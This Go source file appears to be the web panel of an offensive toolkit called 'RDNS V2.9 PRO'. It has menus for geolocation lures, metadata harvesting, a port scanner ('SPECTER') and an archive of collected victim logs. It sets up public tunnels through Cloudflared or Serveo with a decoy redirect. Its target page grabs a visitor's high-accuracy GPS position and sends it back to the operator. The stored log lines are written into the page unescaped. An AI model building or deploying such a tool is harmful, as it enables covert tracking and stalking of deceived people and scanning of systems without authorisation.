package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
	"rdns_suite/tools"
)

func renderHeader(w http.ResponseWriter) {
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
	<style>
		body { background: #f8f9fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-bottom: 40px; }
		.navbar { background: #fff; border-bottom: 2px solid #6f42c1; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
		.card { border: none; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 15px; }
		.console { background: #121212; color: #00ff41; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 11px; }
		.link-box { background: #f1f3f5; border: 1px solid #dee2e6; padding: 12px; border-radius: 8px; font-family: monospace; }
		.btn-group-xs > .btn { padding: .15rem .4rem; font-size: .75rem; }
	</style></head><body>
	<nav class="navbar mb-4"><div class="container-fluid"><a class="navbar-brand fw-bold text-purple" style="color:#6f42c1" href="?admin=rdns">RDNS <span class="badge bg-dark">V2.9 PRO</span></a></div></nav>
	<div class="container">`)
}

func renderLobby(w http.ResponseWriter) {
	fmt.Fprintf(w, `
	<div class="row g-3 text-center">
		<div class="col-6"><a href="?admin=rdns&tool=geolocate" class="text-decoration-none"><div class="card p-4 border-bottom border-primary border-4"><h1>📍</h1><small class="fw-bold text-dark">GEOLOCATE</small></div></a></div>
		<div class="col-6"><a href="?admin=rdns&tool=metadata" class="text-decoration-none"><div class="card p-4 border-bottom border-success border-4"><h1>🖼️</h1><small class="fw-bold text-dark">METADATA</small></div></a></div>
		<div class="col-6"><a href="?admin=rdns&tool=specter" class="text-decoration-none"><div class="card p-4 border-bottom border-danger border-4"><h1>🔍</h1><small class="fw-bold text-dark">SPECTER</small></div></a></div>
		<div class="col-6"><a href="?admin=rdns&tool=archive" class="text-decoration-none"><div class="card p-4 border-bottom border-warning border-4"><h1>📁</h1><small class="fw-bold text-dark">ARCHIVE</small></div></a></div>
	</div>`)
}

func renderGeoConfig(w http.ResponseWriter) {
	fmt.Fprintf(w, `
	<div class="card p-4 border-start border-primary border-4 shadow">
		<h5 class="fw-bold text-primary mb-4">📍 GEOLOCATE SETUP</h5>
		<form method="POST" action="?admin=rdns&tool=geolocate&action=launch">
			<label class="small fw-bold mb-1">CHOOSE TUNNEL PROVIDER</label>
			<select name="provider" class="form-select mb-3">
				<option value="cloudflare">Cloudflared (Stable)</option>
				<option value="serveo">Serveo.net (Simple)</option>
				<option value="localhost">Localhost.run</option>
			</select>
			<label class="small fw-bold mb-1">REDIRECT TARGET (DUMMY)</label>
			<input type="text" name="custom_url" class="form-control mb-4" placeholder="https://google.com">
			<button type="submit" class="btn btn-primary w-100 fw-bold py-2">START OPERATION</button>
		</form>
	</div>`)
}

func renderWorkbench(w http.ResponseWriter, rows []string, tunnelURL string) {
	fmt.Fprintf(w, `
	<div class="card p-3 shadow border-start border-primary border-4">
		<div class="d-flex justify-content-between align-items-center mb-3">
			<h6 class="fw-bold text-primary m-0">🛠️ OPERATION WORKBENCH</h6>
			<div class="btn-group btn-group-xs">
				<a href="?admin=rdns&tool=geolocate&action=new_session" class="btn btn-outline-warning">NEW SESSION</a>
				<a href="?admin=rdns&tool=geolocate&action=kill" class="btn btn-outline-danger">KILL TUNNEL</a>
			</div>
		</div>
		
		<div class="link-box mb-3 shadow-sm">
			<div class="d-flex justify-content-between align-items-center mb-1">
				<label class="small fw-bold text-muted m-0">PUBLIC TUNNEL URL:</label>
				<a href="?admin=rdns&tool=geolocate&exec=true" class="btn btn-xs btn-primary" style="font-size:9px">REFRESH LINK</a>
			</div>
			<div class="d-flex align-items-center">
				<code id="tLink" class="text-primary fw-bold" style="font-size:13px">%s</code>
				<button class="btn btn-sm btn-dark ms-auto py-0 px-2" style="font-size:10px" onclick="copyLink()">COPY</button>
			</div>
		</div>

		<div class="console mb-3 shadow-inner">
			<div>[SESSION] Monitoring activity...</div>
			<div>[TUNNEL] Provider status: ACTIVE</div>
		</div>`, tunnelURL)
	
	tools.RenderGeoTable(w, rows, false)
	
	fmt.Fprintf(w, `
	<script>
	function copyLink() {
		var text = document.getElementById("tLink").innerText;
		if(text.includes("...")) { alert("Tunggu link generate dulu!"); return; }
		navigator.clipboard.writeText(text);
		alert("Link Copied!");
	}
	</script>
	</div>`)
}

func renderArticle(w http.ResponseWriter) {
	fmt.Fprintf(w, `
	<div class="card p-3 border-start border-danger border-4">
		<h6 class="fw-bold text-danger mb-3">🔍 SPECTER SCANNER</h6>
		<form method="POST" action="?admin=rdns&tool=specter&exec=true">
			<label class="small fw-bold mb-1">TARGET IP / DOMAIN</label>
			<input type="text" name="target" class="form-control mb-3" placeholder="127.0.0.1">
			<button type="submit" class="btn btn-danger w-100 fw-bold">SCAN PORTS</button>
		</form>
	</div>`)
}

func renderArchive(w http.ResponseWriter) {
	g, _ := os.ReadFile(dbGeo); m, _ := os.ReadFile(dbMeta)
	fmt.Fprintf(w, `
	<div class="card p-3 border-start border-warning border-4">
		<h6 class="fw-bold text-warning mb-3">📁 MASTER DATABASE</h6>
		<ul class="nav nav-pills nav-fill mb-3 bg-light p-1 rounded">
			<li class="nav-item"><button class="nav-link active py-1 small" data-bs-toggle="tab" data-bs-target="#tg">Geo Logs</button></li>
			<li class="nav-item"><button class="nav-link py-1 small" data-bs-toggle="tab" data-bs-target="#tm">Meta Logs</button></li>
		</ul>
		<div class="tab-content">
			<div class="tab-pane fade show active" id="tg">
				<form method="POST" action="?admin=rdns&tool=archive&action=delete">
					<input type="hidden" name="log_type" value="geo">
					<div class="table-responsive bg-white rounded border" style="max-height:250px"><table class="table table-sm small mb-0"><tbody>`)
	for _, line := range strings.Split(strings.TrimSpace(string(g)), "\n") {
		if line == "" { continue }
		fmt.Fprintf(w, `<tr><td><input type="checkbox" name="del_item" value="%s"></td><td><code>%s</code></td></tr>`, line, line)
	}
	fmt.Fprintf(w, `</tbody></table></div><button type="submit" class="btn btn-danger btn-sm w-100 mt-2 fw-bold">DELETE PERMANENTLY</button></form></div>
			<div class="tab-pane fade" id="tm">
				<form method="POST" action="?admin=rdns&tool=archive&action=delete">
					<input type="hidden" name="log_type" value="meta">
					<div class="table-responsive bg-white rounded border" style="max-height:250px"><table class="table table-sm small mb-0"><tbody>`)
	for _, line := range strings.Split(strings.TrimSpace(string(m)), "\n") {
		if line == "" { continue }
		fmt.Fprintf(w, `<tr><td><input type="checkbox" name="del_item" value="%s"></td><td><code>%s</code></td></tr>`, line, line)
	}
	fmt.Fprintf(w, `</tbody></table></div><button type="submit" class="btn btn-danger btn-sm w-100 mt-2 fw-bold">DELETE PERMANENTLY</button></form></div>
		</div>
	</div>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>`)
}

func renderTarget(w http.ResponseWriter) {
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><script>
	navigator.geolocation.getCurrentPosition(p=>{
		window.location.href="?v=1&l="+p.coords.latitude+","+p.coords.longitude;
	}, e=>{ window.location.href="?v=1&l=DENIED"; }, {enableHighAccuracy:true});
	</script></head><body></body></html>`)
}
